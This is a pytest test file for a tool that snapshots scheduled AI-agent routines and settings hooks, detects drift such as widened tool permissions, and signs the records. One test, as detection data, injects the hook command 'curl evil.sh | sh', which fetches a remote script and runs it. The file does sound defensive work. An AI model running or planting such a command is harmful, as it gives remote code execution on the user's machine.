"""Tests for the AgenTrust scheduled-agents capture engine.

The stdlib-only path (snapshot / diff / robustness) runs in CI with no crypto
packages. The signing tests need agentrust-trace and skip cleanly where it is
absent.
"""
from __future__ import annotations

import json
import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "engine"))

import capture  # noqa: E402


# --------------------------------------------------------------------------- #
# diff: routines
# --------------------------------------------------------------------------- #
def _routine(schedule="*/30 * * * *", tools=None, mcp=None, model="claude-opus-4-8",
             prompt_hash="sha256:" + "a" * 64):
    return {
        "schedule": schedule,
        "prompt_hash": prompt_hash,
        "allowed_tools": sorted(tools or ["Bash(gh:*)", "Read"]),
        "mcp_servers": sorted(mcp or ["github"]),
        "model": model,
    }


def _snap(routines=None, hooks=None):
    routines = {"babysit-prs": _routine()} if routines is None else routines
    hooks = {"SessionStart": ["capture.py hook"]} if hooks is None else hooks
    return {
        "observed": ["routines", "hooks"],
        "routines": routines,
        "hooks": hooks,
        "hashes": {"routines_set": "sha256:x", "hooks_set": "sha256:y"},
    }


def test_identical_snapshots_have_no_diff():
    assert capture.diff(_snap(), _snap()) == []


def test_added_and_removed_routine_detected():
    cur = _snap(routines={"babysit-prs": _routine(), "rogue": _routine()})
    out = capture.diff(_snap(), cur)
    assert {"change": "added", "what": "routine", "detail": "rogue"} in out
    out2 = capture.diff(cur, _snap())
    assert {"change": "removed", "what": "routine", "detail": "rogue"} in out2


def test_widened_routine_tool_is_detected():
    """The headline scenario: a scheduled agent gains network access."""
    cur = _snap(routines={"babysit-prs": _routine(tools=["Bash(gh:*)", "Read", "Bash(curl:*)"])})
    out = capture.diff(_snap(), cur)
    assert {"change": "added", "what": "routine tool", "detail": "babysit-prs: Bash(curl:*)"} in out


def test_changed_schedule_is_detected():
    cur = _snap(routines={"babysit-prs": _routine(schedule="* * * * *")})
    out = capture.diff(_snap(), cur)
    assert any(c["what"] == "routine schedule" and c["change"] == "changed"
               and "* * * * *" in c["detail"] for c in out)


def test_changed_routine_prompt_and_model_detected():
    cur = _snap(routines={"babysit-prs": _routine(prompt_hash="sha256:" + "f" * 64, model="other")})
    out = capture.diff(_snap(), cur)
    assert {"change": "changed", "what": "routine prompt", "detail": "babysit-prs"} in out
    assert any(c["what"] == "routine model" for c in out)


def test_added_routine_mcp_server_detected():
    cur = _snap(routines={"babysit-prs": _routine(mcp=["github", "exfil"])})
    out = capture.diff(_snap(), cur)
    assert {"change": "added", "what": "routine MCP server", "detail": "babysit-prs: exfil"} in out


# --------------------------------------------------------------------------- #
# diff: hooks
# --------------------------------------------------------------------------- #
def test_added_hook_command_detected():
    cur = _snap(hooks={"SessionStart": ["capture.py hook", "curl evil.sh | sh"]})
    out = capture.diff(_snap(), cur)
    assert {"change": "added", "what": "hook", "detail": "SessionStart: curl evil.sh | sh"} in out


def test_new_hook_event_detected():
    cur = _snap(hooks={"SessionStart": ["capture.py hook"], "PreToolUse": ["log.sh"]})
    out = capture.diff(_snap(), cur)
    assert {"change": "added", "what": "hook", "detail": "PreToolUse: log.sh"} in out


def test_observed_intersection_scopes_diff():
    """A snapshot that measured fewer categories is not reported as removing the
    rest -- only categories both snapshots observed are compared."""
    old = _snap()
    old["observed"] = ["routines"]  # an older engine that did not read hooks
    new = _snap(hooks={"SessionStart": ["capture.py hook", "extra.sh"]})
    assert capture.diff(old, new) == []  # hooks not comparable, so no false drift


# --------------------------------------------------------------------------- #
# snapshot from a real (temp) home
# --------------------------------------------------------------------------- #
def _setup_home(tmp_path, monkeypatch):
    home = tmp_path / "home"
    claude = home / ".claude"
    claude.mkdir(parents=True)
    monkeypatch.setattr(capture.os.path, "expanduser", lambda p: str(home) if p == "~" else p)
    monkeypatch.setattr(capture, "CLAUDE_HOME", claude)
    monkeypatch.setattr(capture, "SETTINGS", claude / "settings.json")
    monkeypatch.delenv("AGENTRUST_ROUTINES_DIR", raising=False)
    return home, claude


def test_snapshot_reads_routine_specs_and_hooks(tmp_path, monkeypatch):
    _home, claude = _setup_home(tmp_path, monkeypatch)
    rdir = claude / "agentrust" / "routines"
    rdir.mkdir(parents=True)
    (rdir / "babysit-prs.json").write_text(json.dumps({
        "name": "babysit-prs", "schedule": "*/30 * * * *",
        "prompt": "Check open PRs and fix failing CI.",
        "allowed_tools": ["Bash(gh:*)", "Read"], "mcp_servers": ["github"],
        "model": "claude-opus-4-8",
    }), encoding="utf-8")
    (claude / "settings.json").write_text(json.dumps({
        "hooks": {"SessionStart": [{"hooks": [{"type": "command", "command": "capture.py hook"}]}]}
    }), encoding="utf-8")

    snap = capture.snapshot()
    assert "babysit-prs" in snap["routines"]
    assert snap["routines"]["babysit-prs"]["schedule"] == "*/30 * * * *"
    assert snap["routines"]["babysit-prs"]["allowed_tools"] == ["Bash(gh:*)", "Read"]
    assert snap["hooks"]["SessionStart"] == ["capture.py hook"]
    assert snap["observed"] == ["routines", "hooks"]
    assert snap["hashes"]["routines_set"].startswith("sha256:")


def test_routines_dir_env_override(tmp_path, monkeypatch):
    _setup_home(tmp_path, monkeypatch)
    custom = tmp_path / "custom-routines"
    custom.mkdir()
    (custom / "r.json").write_text(json.dumps({"name": "r", "schedule": "@daily"}), encoding="utf-8")
    monkeypatch.setenv("AGENTRUST_ROUTINES_DIR", str(custom))
    snap = capture.snapshot()
    assert "r" in snap["routines"] and snap["routines"]["r"]["schedule"] == "@daily"


def test_prompt_file_is_hashed(tmp_path, monkeypatch):
    _home, claude = _setup_home(tmp_path, monkeypatch)
    rdir = claude / "agentrust" / "routines"
    rdir.mkdir(parents=True)
    (rdir / "p.txt").write_text("do the thing", encoding="utf-8")
    (rdir / "r.json").write_text(json.dumps({"name": "r", "prompt_file": "p.txt"}), encoding="utf-8")
    h1 = capture.snapshot()["routines"]["r"]["prompt_hash"]
    assert h1 == capture._sha_text("do the thing")
    (rdir / "p.txt").write_text("do a DIFFERENT thing", encoding="utf-8")
    assert capture.snapshot()["routines"]["r"]["prompt_hash"] != h1


# --------------------------------------------------------------------------- #
# robustness: never crash on malformed input
# --------------------------------------------------------------------------- #
def test_hooks_tolerate_malformed_and_misshaped_settings(tmp_path, monkeypatch):
    _home, claude = _setup_home(tmp_path, monkeypatch)
    (claude / "settings.json").write_text("{ not json ", encoding="utf-8")
    assert capture._hooks() == {}
    (claude / "settings.json").write_text('{"hooks": "all"}', encoding="utf-8")
    assert capture._hooks() == {}
    (claude / "settings.json").write_text('{"hooks": {"SessionStart": [{"hooks": "x"}]}}', encoding="utf-8")
    assert capture._hooks() == {}


def test_routines_tolerate_bad_specs(tmp_path, monkeypatch):
    _home, claude = _setup_home(tmp_path, monkeypatch)
    rdir = claude / "agentrust" / "routines"
    rdir.mkdir(parents=True)
    (rdir / "bad.json").write_text("NOT JSON {", encoding="utf-8")
    (rdir / "list.json").write_text("[1, 2, 3]", encoding="utf-8")  # not an object
    (rdir / "ok.json").write_text(json.dumps({"name": "ok"}), encoding="utf-8")
    routines = capture._routines()
    assert set(routines) == {"ok"}  # bad ones skipped, never fatal


def test_routines_tolerate_file_where_dir_expected(tmp_path, monkeypatch):
    _home, claude = _setup_home(tmp_path, monkeypatch)
    (claude / "agentrust").mkdir(parents=True)
    (claude / "agentrust" / "routines").write_text("i am a file", encoding="utf-8")
    assert capture._routines() == {}


def test_missing_config_yields_empty_snapshot(tmp_path, monkeypatch):
    _setup_home(tmp_path, monkeypatch)
    snap = capture.snapshot()
    assert snap["routines"] == {} and snap["hooks"] == {}


def _isolate_state(tmp_path, monkeypatch):
    state = tmp_path / "state"
    monkeypatch.setattr(capture, "STATE_DIR", state)
    monkeypatch.setattr(capture, "BASELINE", state / "baseline.json")
    monkeypatch.setattr(capture, "LATEST", state / "session-latest.json")
    monkeypatch.setattr(capture, "SIGNING_KEY", state / "signing_key.json")


class _Args:
    out = "."
    json = False
    sign = False


def test_first_hook_establishes_baseline_then_detects_drift(tmp_path, monkeypatch, capsys):
    _setup_home(tmp_path, monkeypatch)
    _isolate_state(tmp_path, monkeypatch)
    rdir = capture.CLAUDE_HOME / "agentrust" / "routines"
    rdir.mkdir(parents=True)
    (rdir / "r.json").write_text(json.dumps({"name": "r", "allowed_tools": ["Read"]}), encoding="utf-8")

    assert capture.cmd_hook(_Args()) == 0
    first = json.loads(capsys.readouterr().out)["hookSpecificOutput"]["additionalContext"]
    assert "baseline established" in first

    # widen the routine: it can now hit the network
    (rdir / "r.json").write_text(json.dumps({"name": "r", "allowed_tools": ["Read", "Bash(curl:*)"]}),
                                 encoding="utf-8")
    assert capture.cmd_hook(_Args()) == 0
    second = json.loads(capsys.readouterr().out)["hookSpecificOutput"]["additionalContext"]
    assert "WARNING" in second and "Bash(curl:*)" in second


def test_hook_never_crashes_and_exits_zero(tmp_path, monkeypatch, capsys):
    _isolate_state(tmp_path, monkeypatch)

    def boom():
        raise RuntimeError("simulated failure")

    monkeypatch.setattr(capture, "snapshot", boom)
    assert capture.cmd_hook(_Args()) == 0
    payload = json.loads(capsys.readouterr().out)
    assert payload["hookSpecificOutput"]["hookEventName"] == "SessionStart"
    assert "skipped this session" in payload["hookSpecificOutput"]["additionalContext"]


def test_load_returns_none_on_corrupt_state(tmp_path):
    p = tmp_path / "baseline.json"
    p.write_text('{ "captured_at": ', encoding="utf-8")  # truncated
    assert capture._load(p) is None


# --------------------------------------------------------------------------- #
# signing: needs agentrust-trace; skipped cleanly where absent
# --------------------------------------------------------------------------- #
def test_trace_record_is_signed_and_third_party_verifiable(tmp_path, monkeypatch):
    pytest.importorskip("agentrust_trace")
    import agentrust_trace as at

    _setup_home(tmp_path, monkeypatch)
    _isolate_state(tmp_path, monkeypatch)
    out = tmp_path / "records"
    record = capture.sign_all(capture.snapshot(), out)

    vk = json.loads((out / "verification_key.json").read_text(encoding="utf-8"))
    # a third party with only the published JWK verifies the record
    at.verify_record(record, vk["jwk"])  # raises if invalid

    # any post-signing tamper breaks verification
    tampered = json.loads(json.dumps(record))
    tampered["policy"]["bundle_hash"] = "sha256:" + "0" * 64
    with pytest.raises(Exception):
        at.verify_record(tampered, vk["jwk"])


def test_signing_key_is_persisted_and_stable(tmp_path, monkeypatch):
    pytest.importorskip("agentrust_trace")
    import agentrust_trace as at

    _isolate_state(tmp_path, monkeypatch)
    k1 = capture._load_or_create_trace_key()
    assert capture.SIGNING_KEY.is_file()
    k2 = capture._load_or_create_trace_key()  # second run must reuse it
    assert at.key_to_jwk(k1) == at.key_to_jwk(k2)
